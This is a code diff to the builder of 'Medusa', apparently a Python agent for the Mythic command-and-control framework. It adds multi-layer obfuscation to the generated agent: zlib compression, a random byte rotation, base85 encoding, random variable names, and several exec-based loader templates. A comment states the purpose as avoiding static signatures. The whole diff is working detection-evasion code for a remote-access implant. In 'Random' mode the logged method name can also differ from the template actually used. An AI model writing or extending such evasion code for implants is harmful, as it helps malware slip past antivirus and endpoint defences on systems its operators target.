@@ -44,9 +44,9 @@ class Medusa(PayloadType):
         BuildParameter(
             name="obfuscate_script",
             parameter_type=BuildParameterType.ChooseOne,
-            description="XOR and Base64-encode agent code",
-            choices=["Yes", "No"],
-            default_value="No"
+            description="Choose obfuscation method for agent code",
+            choices=["None", "Random", "GetAttr", "Lambda", "Map"],
+            default_value="None"
         ),
         BuildParameter(
             name="https_check",
@@ -159,19 +159,68 @@ class Medusa(PayloadType):
                 StepSuccess=True
             ))
 
-            if self.get_parameter("obfuscate_script") == "Yes":
-                key = hashlib.md5(os.urandom(128)).hexdigest().encode()
-                encrypted_content = ''.join(chr(c^k) for c,k in zip(base_code.encode(), cycle(key))).encode()
-                b64_enc_content = base64.b64encode(encrypted_content)
-                xor_func = "chr(c^k)" if self.get_parameter("python_version") == "Python 3.8" else "chr(ord(c)^ord(k))"
-                base_code = """import base64, itertools
-exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())
-""".format(xor_func, b64_enc_content, key)
+            obfuscation_method = self.get_parameter("obfuscate_script")
+            if obfuscation_method != "None":
+                # Use a multi-layer obfuscation approach to avoid static signatures
+                import random, string, zlib
+                
+                # Generate random variable names
+                var1 = ''.join(random.choices(string.ascii_letters, k=8))
+                var2 = ''.join(random.choices(string.ascii_letters, k=8))
+                var3 = ''.join(random.choices(string.ascii_letters, k=8))
+                var4 = ''.join(random.choices(string.ascii_letters, k=8))
+                
+                # Step 1: Compress the code
+                compressed_code = zlib.compress(base_code.encode())
+                
+                # Step 2: Apply multiple transformations
+                # ROT13-like transformation with random offset
+                rot_offset = random.randint(1, 25)
+                transformed = bytearray()
+                for byte in compressed_code:
+                    # Apply rotation with wrapping
+                    new_byte = ((byte + rot_offset) % 256)
+                    transformed.append(new_byte)
+                
+                # Step 3: Encode with base85 (less common than base64)
+                import base64
+                encoded_content = base64.b85encode(bytes(transformed))
+                
+                # Step 4: Create obfuscated loader based on selected method
+                loader_templates = {
+                    "GetAttr": """import zlib as {var1}, base64 as {var2}
+{var3} = getattr({var2}, 'b85decode')
+{var4} = bytes(((x - {rot_offset}) % 256) for x in {var3}({encoded_content}))
+exec(getattr({var1}, 'decompress')({var4}).decode())""",
+                    
+                    "Lambda": """import zlib, base64
+{var3} = lambda x: bytes(((b - {rot_offset}) % 256) for b in base64.b85decode(x))
+{var4} = zlib.decompress({var3}({encoded_content})).decode()
+exec({var4})""",
+                    
+                    "Map": """import zlib, base64
+{var3} = list(map(lambda x: (x - {rot_offset}) % 256, base64.b85decode({encoded_content})))
+{var4} = zlib.decompress(bytes({var3}))
+exec({var4}.decode())"""
+                }
+                
+                # Select template based on user choice or random
+                if obfuscation_method == "Random":
+                    selected_template = random.choice(list(loader_templates.values()))
+                    method_name = "Random (" + random.choice(list(loader_templates.keys())) + ")"
+                else:
+                    selected_template = loader_templates[obfuscation_method]
+                    method_name = obfuscation_method
+                
+                base_code = selected_template.format(
+                    var1=var1, var2=var2, var3=var3, var4=var4,
+                    rot_offset=rot_offset, encoded_content=encoded_content
+                )
 
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
                     StepName="Obfuscating Script",
-                    StepStdout="Script successfully obfuscated.",
+                    StepStdout=f"Script successfully obfuscated using {method_name} method.",
                     StepSuccess=True
                 ))
             else:
